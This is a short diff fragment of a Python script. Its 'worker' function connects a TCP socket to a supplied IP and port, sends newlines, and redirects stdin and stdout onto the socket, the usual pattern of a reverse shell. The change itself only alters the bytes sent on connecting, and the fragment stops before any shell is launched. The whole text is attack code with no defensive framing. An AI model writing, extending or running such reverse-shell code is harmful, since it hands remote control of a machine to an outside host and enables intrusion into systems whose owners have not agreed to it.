@@ -8,7 +8,7 @@ import argparse
 def worker(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((ip, port))
-    sock.sendall(b'\n')
+    sock.sendall(b'\n\n')
 
     os.dup2(sock.fileno(), 0)
     os.dup2(sock.fileno(), 1)
